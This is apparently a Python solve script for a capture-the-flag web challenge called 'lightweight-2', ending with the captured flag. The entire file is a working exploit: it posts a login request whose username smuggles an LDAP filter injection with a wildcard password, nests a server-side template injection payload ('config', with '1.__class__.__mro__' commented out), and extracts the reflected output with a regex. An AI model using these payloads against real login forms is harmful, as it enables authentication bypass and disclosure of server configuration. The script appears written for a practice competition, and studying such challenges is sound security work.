import requests
import re

url = "https://lightweight-2.chal.bts.wh.edu.pl/"

# payload = "1.__class__.__mro__"
payload = "config"

resp = requests.post(url, data={
    "username": "*)(|(uid=*)(uid={{" + payload + "}})",
    "password": f"*",
    # (&
    #   (employeeType=active)
    #   (uid=*)
    #   (|(uid=*)(uid={{7*7}}))
    #   (userPassword=*)
    # )
})

if resp.status_code == 200:
    print(re.findall(r"\(uid=\*\)\(uid=(.*?)\)", resp.text)[0])
else:
    print(resp.text)

# BtSCTF{_ld4p_1nj3ction_plus_sst1_3quals_fl4g}
